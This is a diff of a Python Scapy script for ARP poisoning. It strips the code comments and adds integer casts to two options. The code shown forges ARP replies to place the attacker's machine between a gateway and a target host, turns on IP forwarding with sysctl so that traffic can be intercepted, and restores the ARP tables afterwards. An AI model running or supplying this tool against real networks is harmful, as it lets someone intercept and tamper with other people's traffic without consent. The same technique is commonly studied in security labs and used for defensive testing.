@@ -7,19 +7,15 @@ import threading
 import time
 
 
-# Given an IP, get the MAC. Broadcast ARP Request for a IP Address. Should recieve
-# an ARP reply with MAC Address
 def get_mac(ip_address):
-    # ARP request is constructed. sr function is used to send/ receive a layer 3 packet
-    # Alternative Method using Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
+   
     resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
     for s, r in resp:
         return r[ARP].hwsrc
     return None
 
 
-# Restore the network by reversing the ARP poison attack. Broadcast ARP Reply with
-# correct MAC and IP Address information
+
 def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
     send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
     send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
@@ -30,8 +26,6 @@ def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
     os.kill(os.getpid(), signal.SIGTERM)
 
 
-# Keep sending false ARP replies to put our machine in the middle to intercept packets
-# This will use our interface MAC address as the hwsrc for the ARP reply
 def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
     print("[*] Started ARP poison attack [CTRL-C to stop]")
     try:
@@ -71,14 +65,12 @@ if __name__ == '__main__':
 
     gateway_ip = options.gateway
     target_ip = options.target
-    packet_count = options.count
+    packet_count = int(options.count)
     conf.iface = options.interface
-    frequency = 60 / options.frequency
+    frequency = 60 / int(options.frequency)
     conf.verb = 0
 
-    # Start the script
     print("[*] Enabling IP forwarding")
-    # Enable IP Forwarding on a mac
     os.system("sysctl -w net.inet.ip.forwarding=1")
     print(f"[*] Gateway IP address: {gateway_ip}")
     print(f"[*] Target IP address: {target_ip}")
